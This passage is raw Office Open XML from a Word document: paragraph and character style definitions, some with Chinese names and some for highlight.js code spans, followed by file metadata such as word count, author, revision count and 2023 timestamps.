    <w:basedOn w:val="a"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:beforeAutospacing="1" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ac">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="a4"/>
    <w:next w:val="a4"/>
    <w:link w:val="ad"/>
    <w:qFormat/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="ae">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTML0">
    <w:name w:val="HTML Typewriter"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af0">
    <w:name w:val="Hyperlink"/>
    <w:qFormat/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="af1">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
    <w:rPr>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af2">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:pPr>
      <w:ind w:left="1341" w:hanging="601"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:lang w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="aa">
    <w:name w:val="页眉 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="a9"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:kern w:val="2"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="a8">
    <w:name w:val="页脚 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="a7"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:kern w:val="2"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>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hljs-meta">
    <w:name w:val="hljs-meta"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-meta-keyword">
    <w:name w:val="hljs-meta-keyword"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-meta-string">
    <w:name w:val="hljs-meta-string"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-function">
    <w:name w:val="hljs-function"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-keyword">
    <w:name w:val="hljs-keyword"/>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number">
    <w:name w:val="hljs-number"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-comment">
    <w:name w:val="hljs-comment"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-builtin">
    <w:name w:val="hljs-built_in"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-string">
    <w:name w:val="hljs-string"/>
    <w:basedOn w:val="a0"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="10">
    <w:name w:val="修订1"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:kern w:val="2"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="a5">
    <w:name w:val="批注文字 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="a4"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:kern w:val="2"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ad">
    <w:name w:val="批注主题 字符"/>
    <w:basedOn w:val="a5"/>
    <w:link w:val="ac"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="2"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="20">
    <w:name w:val="修订2"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:kern w:val="2"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="30">
    <w:name w:val="修订3"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:kern w:val="2"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="af3">
    <w:name w:val="Revision"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="0047249A"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibr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microsoft.com/office/2016/09/relationships/commentsIds" Target="commentsIds.xm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976</Words>
  <Characters>5564</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>46</Lines>
  <Paragraphs>13</Paragraphs>
  <ScaleCrop>false</ScaleCrop>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cage</dc:creator>
  <cp:lastModifiedBy>zhao ruizhi</cp:lastModifiedBy>
  <cp:revision>140</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-04-29T18:38:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-05-11T20:58:00Z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2052-11.1.0.11698</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="ICV">
    <vt:lpwstr>64E77CD97956444D8C4F789FAAC0EB3F</vt:lpwstr>
  </property>
</Properties>
</file>